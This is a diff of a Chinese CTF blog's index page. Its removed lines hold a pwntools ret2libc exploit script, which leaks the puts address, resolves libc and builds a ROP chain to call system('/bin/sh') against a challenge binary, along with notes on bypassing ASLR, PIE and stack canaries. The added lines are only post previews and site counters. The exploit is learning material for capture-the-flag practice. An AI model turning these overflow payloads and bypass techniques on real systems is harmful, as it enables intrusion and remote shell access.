-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, bits=<span class="number">64</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;/usr/bin/x-terminal-emulator&#x27;</span>, <span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Interface</span></span><br><span class="line">local = <span class="literal">True</span></span><br><span class="line">binary_name = <span class="string">&#x27;filename&#x27;</span></span><br><span class="line">port = <span class="number">12345</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process([<span class="string">&quot;./&quot;</span> + binary_name])</span><br><span class="line">    e = ELF(<span class="string">&#x27;./&#x27;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&#x27;e.libc&#x27;)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;ctf.spaceskynet.top&quot;</span>, port)</span><br><span class="line">    e = ELF(<span class="string">&quot;./&quot;</span> + binary_name)</span><br><span class="line">    <span class="comment"># libc = ELF(&quot;libc-2.23.so&quot;)</span></span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">z</span>(<span class="params">a=<span class="string">&#x27;&#x27;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        gdb.attach(p, a)</span><br><span class="line">        <span class="keyword">if</span> a == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">            raw_input()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rc = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sd = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sla = <span class="keyword">lambda</span> delim, data: p.sendlineafter(delim, data)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x400c83</span></span><br><span class="line">penc = <span class="number">0x4009a0</span></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    z(<span class="string">&#x27;b *0x4009d1\nb *0x400aee&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;choice&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">0x08</span> + p64(prdi) + p64(e.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(e.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(penc)	<span class="comment"># 泄露puts函数地址</span></span><br><span class="line">    sla(<span class="string">&#x27;encrypted&#x27;</span>, payload)	</span><br><span class="line">    </span><br><span class="line">    ru(<span class="string">b&#x27;\x40\x0a&#x27;</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;start detecting libc address&#x27;</span>)</span><br><span class="line">    libc_puts = u64(p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    log.success(<span class="string">&#x27;libc puts address found:&#x27;</span> + <span class="built_in">hex</span>(libc_puts))</span><br><span class="line">    libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>, libc_puts)</span><br><span class="line">    <span class="comment"># libc.symbols[&#x27;puts&#x27;]</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># libc.select_libc(0)</span></span><br><span class="line">    libc_addr = libc_puts - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">    rtn_addr = <span class="number">0x400b27</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x50</span> + <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>):</span><br><span class="line">        payload += p64(rtn_addr)	<span class="comment"># for align</span></span><br><span class="line">    payload += p64(prdi) + p64(libc_addr + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)) + p64(libc_addr + libc.dump(<span class="string">&quot;system&quot;</span>))</span><br><span class="line">    sla(<span class="string">&#x27;encrypted&#x27;</span>, payload)</span><br><span class="line">    </span><br><span class="line">    p.interactive()</span><br></pre></td></tr></table></figure>
-<h1 id="8-ELF保护措施及绕过方法"><a href="#8-ELF保护措施及绕过方法" class="headerlink" title="8. ELF保护措施及绕过方法"></a>8. ELF保护措施及绕过方法</h1><h2 id="8-1-ASLR"><a href="#8-1-ASLR" class="headerlink" title="8.1 ASLR"></a>8.1 ASLR</h2><p>ASLR(Address space layout randomization)——地址空间配置随机化</p>
-<p>将可执行文件、共享库、栈、堆的基址随机化，用于防范明确地址的内存破坏攻击，比如ret2libc、stack address。</p>
-<p>应对方法：地址泄露</p>
-<h2 id="8-2-NX"><a href="#8-2-NX" class="headerlink" title="8.2 NX"></a>8.2 NX</h2><p>看[7.ROP链构造]</p>
-<h2 id="8-3-PIE"><a href="#8-3-PIE" class="headerlink" title="8.3 PIE"></a>8.3 PIE</h2><p>PIE(Position-independent executable)——地址无关代码/可执行文件</p>
-<p>无论文件被加载进内存空间的什么地址中，程序都能够正常运行。在共享库链接中有重要作用。共享库文件被动态链接到内存中，PIE使其能正确处理外部引用。在普通ELF文件上，ELF配合ASLR，使其基址不可预测，增加了攻击难度。</p>
-<p>整个ELF文件都会被装载进一个随机偏移的连续内存空间里，只有基址变成了未知，其它都是相同的。</p>
-<p>应对方法：Partial Writing</p>
-<p>程序的加载以内存页(4K)为单位，基地址后3位(hex)一定为0，同一文件被加载进连续地址中。</p>
-<p>一般利用Return Address控制跳转，可通过栈上已有地址，只修改最低3位(2B，4位)值，控制转向</p>
-<h2 id="8-4-Canary"><a href="#8-4-Canary" class="headerlink" title="8.4 Canary"></a>8.4 Canary</h2><p>Canary(Canary in a coal mine)——金丝雀</p>
-<p>一串随机数据，放置在栈数据和控制信息之间，函数开始时被放入，退出前检验，若被修改立即终止程序，极大地防范了栈溢出攻击。</p>
-<p>应对方法：Canary Leak</p>
-<ul>
-<li>覆盖栈到Canary处，利用puts等函数泄露地址</li>
-<li>Canary最低字节为0，防止连带输出</li>
-</ul>
-<p>小技巧：<code>scanf(&quot;%d&quot;);</code>输入”+”不覆盖内存数据</p>
-<h1 id="9-Stack-Pivot"><a href="#9-Stack-Pivot" class="headerlink" title="9. Stack Pivot"></a>9. Stack Pivot</h1><p>假如可供泄露空间过少，或者需要整段可控的栈空间，这就需要使栈帧移向可控栈空间，控制程序执行流转向。</p>
+          <h1 id="1-signin"><a href="#1-signin" class="headerlink" title="1. signin"></a>1. signin</h1><p>运行一下程序。</p>
+<img src="/posts/17c1c819/1.png" class="" title="运行程序">
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/17c1c819.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
+      
+    </div>
 
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/posts/6b338c34.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.png">
+      <meta itemprop="name" content="v5le0n9">
+      <meta itemprop="description" content="v5le0n9's garden">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="v5le0n9's garden">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/posts/6b338c34.html" class="post-title-link" itemprop="url">Base系列算法</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-04-05 09:29:27" itemprop="dateCreated datePublished" datetime="2022-04-05T09:29:27+08:00">2022-04-05</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-11 13:26:25" itemprop="dateModified" datetime="2022-04-11T13:26:25+08:00">2022-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E7%AE%97%E6%B3%95/" itemprop="url" rel="index"><span itemprop="name">算法</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>8.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>8 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>玩着玩着CTF发现我基础太差了，很多基本原理算法都没有摸清，因为以前大多数用工具就可以解出来，所以没有太在意算法之类，但我最近遇到了一道题，它的Base64映射表换一下我就完全摸不着头脑。所以这篇笔记就来了。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/posts/6b338c34.html#more" rel="contents">
+                阅读全文 &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
@@ -1418,7 +1252,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span>
+    <a class="extend prev" rel="prev" href="/page/2/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/4/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1486,7 +1320,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-count">31</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1550,7 +1384,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">694k</span>
+    <span title="站点总字数">695k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
